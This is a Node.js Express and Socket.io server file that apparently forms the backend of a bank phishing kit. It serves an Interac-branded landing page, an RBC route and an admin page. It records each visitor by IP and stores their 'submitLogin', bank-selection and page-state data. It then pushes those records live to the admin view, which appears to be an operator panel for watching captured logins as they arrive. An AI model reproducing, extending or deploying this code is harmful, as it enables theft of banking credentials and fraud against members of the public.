// ====================
// Module Imports
// ====================
const express = require('express');
const { createServer } = require('node:http');
const bodyParser = require('body-parser');
const { join } = require('node:path');
const { Server } = require('socket.io');
const fs = require('fs');
const { time } = require('node:console');
const {
  emitUpdatedUsers,
  usersAdd,
  verifyUser,
  usersSearchByIP,
  usersRemove,
  usersModify,
} = require('./utilityUser');

// ====================
// Configuration
// ====================
const app = express();
const server = createServer(app);
const io = new Server(server);
const REAL_PATH = __dirname;
let users = [];

// ====================
// Middleware
// ====================
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(join(__dirname, '/landing/interac/page.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(join(__dirname, '/admin/page.html'));
});

app.use('/rbc', require('./routes/rbc'));

// ====================
// Socket Handling
// ====================
io.on('connection', (socket) => {
  let user = null;
  let userIP = socket.handshake.address.replace('::ffff:', '');
  //console.log(`${userIP} user connected !`);
  user = usersSearchByIP(userIP)

  if (user) {
    //console.log(`${userIP} user already exist !`);
    user = usersModify(userIP, { status: true });
    //console.log(user);
    emitUpdatedUsers(io)
  } else {
    //console.log(`${userIP} user not exist !`)
    socket.join(userIP);
    user = { ip: userIP, status: true }
    user = usersAdd(user)
    //console.log(`user was succesfully added: ${user.ip}`)
    emitUpdatedUsers(io)
  }

  socket.on('disconnect', () => {
    if (verifyUser(userIP)) {
      user = usersModify(userIP, { status: false });
      //console.log(user)
      emitUpdatedUsers(io)
    }
  });

  socket.on('updateBanks', (data) =>{
    //console.log(data)
    if(verifyUser(userIP)) {
      user = usersModify(userIP, data);
      emitUpdatedUsers(io)
    }
  })
  
  socket.on('updatePage', (data) =>{
    //console.log(data)
    if(verifyUser(userIP)) {
      user = usersModify(userIP, data);
      emitUpdatedUsers(io)
    }
  })

  socket.on('submitLogin', (data) => {
    if(verifyUser(userIP)) {
      user = usersModify(userIP, data);
      emitUpdatedUsers(io);
    }
    //console.log(data)
  })
});

fs.watch('users.json', (eventType, filename) => {
  if (filename && eventType === 'change') {
      emitUpdatedUsers(io);
  }
});

// ====================
// Server Startup
// ====================
server.listen(3000, () => {
  console.log('server running at http://localhost:3000');
});